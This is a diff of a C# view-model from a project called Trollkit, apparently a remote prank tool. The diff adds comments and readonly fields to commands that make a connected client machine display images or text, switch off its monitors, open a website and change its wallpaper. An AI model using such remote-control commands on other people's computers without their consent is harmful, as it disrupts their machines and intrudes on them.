@@ -12,14 +12,17 @@ namespace Trollkit_Library.ViewModels.Commands
 {
     public class VisualCommands
     {
-		private Server _server;
-		private string handler;
+		private readonly Server _server;
+		private readonly string handler;
 
+		//buttons
 		public ICommand DisplayImage { get { return new SendServerCommand(SendDisplayImage); } }
 		public ICommand DisplayText { get { return new SendServerCommand(SendDisplayText); } }
 		public ICommand TurnOffScreen { get { return new SendServerCommand(SendTurnOffScreen); } }
 		public ICommand OpenSite { get { return new SendServerCommand(SendOpenSite); } }
-		public ICommand PickBackgroundImage { get { return new SendServerCommand(SendPickBackgroundImage); } }
+		public ICommand PickBackgroundImage { get { return new SendServerCommand(SendBackgroundImage); } }
+
+		//textboxes
 		public string BroadcastMessageText { get; set; }
 		public string OpenUrlText { get; set; }
 
@@ -28,10 +31,13 @@ namespace Trollkit_Library.ViewModels.Commands
 			_server = server;
 			this.handler = handler;
 
-			BroadcastMessageText = "Dit is een bericht";
+			BroadcastMessageText = "Berichten Box|Dit is een bericht";
 			OpenUrlText = "https://google.com";
 		}	
 
+		/// <summary>
+		/// Function that sends an image to the client, displays the image and then presses f11 on the client.
+		/// </summary>
 		private void SendDisplayImage()
 		{
 			OpenFileDialog open = new OpenFileDialog();
@@ -48,25 +54,37 @@ namespace Trollkit_Library.ViewModels.Commands
 			}
 		}
 
+		/// <summary>
+		/// Opens a textbox on the client with the provided text
+		/// </summary>
 		private void SendDisplayText()
 		{
 			TransferCommandObject returnObject = new TransferCommandObject { Command = "TextBox", Handler = handler, Value = BroadcastMessageText };
 			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
 		}
 
+		/// <summary>
+		/// Turns the client his monitors off
+		/// </summary>
 		private void SendTurnOffScreen()
 		{
 			TransferCommandObject returnObject = new TransferCommandObject { Command = "BlackScreen", Handler = handler };
 			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
 		}
 
+		/// <summary>
+		/// Opens a website in the default browser
+		/// </summary>
 		private void SendOpenSite()
 		{
 			TransferCommandObject returnObject = new TransferCommandObject { Command = "OpenSite", Handler = handler, Value = OpenUrlText };
 			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
 		}
 
-		private void SendPickBackgroundImage()
+		/// <summary>
+		/// Sends an image to the client and sets this as their wallpaper
+		/// </summary>
+		private void SendBackgroundImage()
 		{
 			OpenFileDialog open = new OpenFileDialog();
 			open.Filter = "Image Files(*.png; *.jpg; *.jpeg;)|*.png; *.jpg; *.jpeg;";
